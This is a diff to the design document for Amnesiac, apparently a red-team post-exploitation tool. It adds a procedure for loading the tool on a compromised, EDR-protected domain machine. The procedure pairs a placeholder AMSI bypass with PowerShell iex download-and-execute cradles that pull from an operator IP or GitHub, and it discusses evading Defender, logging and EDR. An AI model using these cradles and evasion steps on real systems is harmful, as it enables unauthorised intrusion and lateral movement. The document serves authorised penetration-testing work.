@@ -16,7 +16,7 @@ All existing Amnesiac functionality (sessions, commands, tool modules) remains f
 ## Operational Scenarios
 
 ### Scenario 1 — Non-Domain-Joined Operator (Red Team External)
-Operator machine is **not joined to the target domain**. The operator has full local admin on their own machine and has domain credentials for the target environment. Amnesiac runs with no EDR constraints on the operator side.
+Operator machine is **not joined to the target domain**. Operator has full local admin on their own machine and domain credentials for the target environment. Loading method is not a concern — operator can disable Defender on their own machine as needed.
 
 Launch from a domain-credentialed session:
 
@@ -34,36 +34,42 @@ engagement nondomained
 Amnesiac detects the network logon token (`runas /netonly` creates a Type-9 NewCredentials logon) and confirms domain credential availability.
 
 **Key characteristics:**
-- Operator machine is NOT monitored — no AMSI/EDR constraints on loading Amnesiac itself
-- Full local admin — can write files, start listeners, run `serve`, etc.
-- `diskmode` defaults to OFF to protect targets, but can be enabled on operator side safely
+- Operator machine is NOT monitored — no loading constraints, Defender can be disabled
+- Full local admin — can run `serve`, write files, start listeners
+- `diskmode` defaults OFF (protects targets); operator can enable it on their own machine safely
 - All target-side operations remain in-memory
 
 ### Scenario 2 — Low-Privilege Assumed Breach (Domain-Joined, EDR-Protected)
-Operator has obtained a **low-privilege shell on a domain-joined machine** that is running Windows Defender and a corporate EDR (e.g., CrowdStrike Falcon). The operator needs to run Amnesiac on THIS compromised machine to enumerate, exploit, and move laterally — not from their own clean machine.
+Operator has obtained a **low-privilege shell on a domain-joined machine** running Windows Defender and a corporate EDR (e.g., CrowdStrike Falcon). The operator runs Amnesiac on THIS compromised machine to enumerate, exploit, and move laterally.
 
-**Key characteristics:**
-- Amnesiac.ps1 itself must not be detected when loaded — AMSI scans the entire script before execution
-- Script Block Logging (event 4104) would expose every command typed
-- Low-privilege: cannot write to system paths, cannot install services, limited WMI access
-- EDR behavioral rules monitor process creation, pipe usage, reflective loading
-- Must use `Amnesiac_ShellReady.ps1` (no ANSI colour codes that may trigger signatures)
-- `diskmode` MUST remain OFF — any disk write may be scanned
+**Loading approach — iex in-memory bootstrap:**
 
-**⚠️ KNOWN GAP — Self-protection loader not yet implemented:**
-Amnesiac.ps1 has no self-bypass. AMSI scans the file before any code runs, so a bypass inside the file cannot protect itself. A separate small loader/bypass stub is required to:
-1. Bypass AMSI in the current PS process
-2. Disable ETW/SBL
-3. Then dot-source Amnesiac_ShellReady.ps1
+AMSI scans scripts at download time, so a one-liner AMSI bypass must run first in the current PS process, then Amnesiac is pulled entirely into memory via `iex` — nothing written to disk.
 
-This is planned but not yet implemented. See: `docs/superpowers/specs/` for future spec.
+```powershell
+# Step 1: AMSI bypass one-liner (any working technique for the target environment)
+# <amsi-bypass-one-liner>
 
-Current workaround: load from an already-AMSI-patched PS session, or use a pre-existing AMSI bypass technique before dot-sourcing.
+# Step 2a: load from operator HTTP server (preferred — no outbound GitHub from target network)
+iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1'); Amnesiac
+
+# Step 2b: load from GitHub if operator server not available
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac
+```
+
+Once loaded into memory, all existing stealth features handle the rest — bypasses active in every generated payload, all tool delivery over the named pipe, no disk writes.
 
 Set engagement profile:
 ```
 engagement domained
 ```
+
+**Key characteristics:**
+- AMSI bypass must run BEFORE the `iex` — the script is scanned on download
+- Use `Amnesiac_ShellReady.ps1` (no ANSI colour codes — cleaner for constrained shell environments)
+- `diskmode` MUST remain OFF — any disk write may be scanned
+- Low-privilege: `serve` cannot write files to disk (diskmode off blocks it); use operator HTTP server to host tools pre-loaded from `Tools\`
+- The operator HTTP server (`serve`) should also host `Amnesiac_ShellReady.ps1` so Scenario 2 machines pull from it rather than GitHub
 
 ---
 
@@ -205,9 +211,8 @@ Amnesiac-main/
 
 | Gap | Impact | Description |
 |-----|--------|-------------|
-| **Scenario 2 self-protection loader** | High | No AMSI/ETW/SBL bypass for loading Amnesiac.ps1 itself on a defender-protected machine. Requires a separate small loader stub that bypasses AMSI in the PS process before dot-sourcing Amnesiac_ShellReady.ps1. |
-| **Tool cache fallback chain** | Medium | `serve` still downloads from GitHub to disk (disk write dependency). `Send-Module` does not auto-fetch missing tools from operator HTTP or GitHub. Tiers 3 and 4 are documented but not wired. |
-| **`serve` diskmode conflict** | Medium | The `serve` command writes files to `Scripts\` folder, which is blocked when `diskmode off`. Should host from `Tools\` in-memory instead of downloading to disk first. |
+| **Tool cache fallback chain** | Medium | `Send-Module` fails if tool not in cache — no auto-fetch from operator HTTP server or GitHub. Tiers 3 and 4 in the load chain are documented but not wired in code. |
+| **`serve` diskmode conflict** | Medium | `serve` downloads tools from GitHub to `Scripts\` folder (disk write), which is blocked by default `diskmode off`. Should instead host tools from `Tools\` in-memory, and also host `Amnesiac_ShellReady.ps1` for Scenario 2 iex loads. |
 
 ---
 
